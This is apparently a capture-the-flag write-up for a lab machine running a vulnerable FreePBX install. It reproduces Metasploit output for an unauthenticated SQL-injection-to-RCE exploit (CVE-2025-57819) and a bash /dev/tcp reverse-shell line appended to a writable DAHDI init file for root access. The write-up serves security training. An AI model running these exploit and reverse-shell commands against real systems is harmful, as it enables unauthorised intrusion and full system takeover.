- **Hostname:** Connected
- **IP Address:** 10.129.245.100

---

## Reconnaissance

### Nmap Scan

```
nmap -sV connected.htb

Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-11 09:13 +0200
Nmap scan report for connected.htb (10.129.245.100)
Host is up (0.038s latency).
Not shown: 996 filtered tcp ports (no-response)

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.4 (protocol 2.0)
53/tcp  open  domain?
80/tcp  open  http       Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/https?
```

The scan revealed four open ports: SSH on 22, DNS on 53, and a web server on ports 80 and 443.

After inspecting the web application, I identified the software running on it as **FreePBX**, a web-based open-source GUI for managing Asterisk, the VoIP framework. The installed version was found to be vulnerable to **CVE-2025-57819**, an unauthenticated SQL injection leading to Remote Code Execution.

---

## CVE-2025-57819 (SQLi → RCE)

### Vulnerability Overview

CVE-2025-57819 is an unauthenticated SQL injection vulnerability in FreePBX's `endpoint` module. The `brand` parameter passed to `/admin/ajax.php` is not properly sanitized, allowing an attacker to inject arbitrary SQL. The standard exploit chain attempts to leverage stacked queries to insert a malicious cron job into the database, which then triggers a reverse shell.

### Exploitation with Metasploit

The public PoC script failed due to PHP's PDO driver blocking stacked queries (the `INSERT` into `cron_jobs` was silently ignored). Instead, the Metasploit module `unix/http/freepbx_unauth_sqli_to_rce` was used, which implements the same technique through a different injection path that successfully bypasses this limitation:

```
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) > run

[*] Started reverse TCP handler on 10.10.15.126:4444
[+] Created cronjob with job name: 'taHRpO'
[*] Waiting for cronjob to trigger...
[*] Command shell session 1 opened (10.10.15.126:4444 -> 10.129.245.100:35910) at 2026-09-11 11:29:08 +0200
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!
```

### Shell Stabilization

The raw shell was upgraded to a fully interactive TTY using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This spawned a stable shell as the `asterisk` service user:

```
[asterisk@connected asterisk]$
```

### User Flag

```bash
[asterisk@connected asterisk]$ cat user.txt
7b1ec1c60fe5d2287b7b387e277b79fd
```

---

## Privilege Escalation

### Enumeration — incron

Rather than looking at running services directly, I focused on file-based triggers. Inspecting `/etc/incron.d/` revealed that `incron` (inotify-based cron) was monitoring several directories writable by the `asterisk` user:

```bash
cat /etc/incron.d/*

/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart   ← interesting
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager -- local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The key entry is:

```
/var/spool/asterisk/sysadmin/dahdi_restart  IN_CLOSE_WRITE  /usr/sbin/sysadmin_dahdi_restart
```

This means that any write to `/var/spool/asterisk/sysadmin/dahdi_restart` will trigger a restart of the **DAHDI** telephony service — running as root.

### Writable Configuration File

Next, I searched for writable configuration files under `/etc`:

```bash
find /etc -type f -name "*.conf" -writable

/etc/modprobe.d/dahdi.conf
/etc/dahdi/init.conf          ← key file
/etc/dahdi/system.conf
...
```

The file `/etc/dahdi/init.conf` is the initialization script executed when DAHDI restarts, and it is writable by the `asterisk` user. Injecting a reverse shell command into this file and then triggering a DAHDI restart will result in code execution as root.

### Exploitation

```bash
# Step 1 — Inject the reverse shell into DAHDI's init config
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.126/4545 0>&1'" >> /etc/dahdi/init.conf

# Step 2 — Trigger the DAHDI restart via incron
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

With a listener ready on port 4545:

```bash
nc -lvnp 4545
```

A root shell was received almost immediately:

```
[root@connected /]#
```

### Root Flag

```bash
[root@connected /]# cat /root/root.txt
4ef5a0d2a3ae2ed48d0b3c3d4ad163e5
```
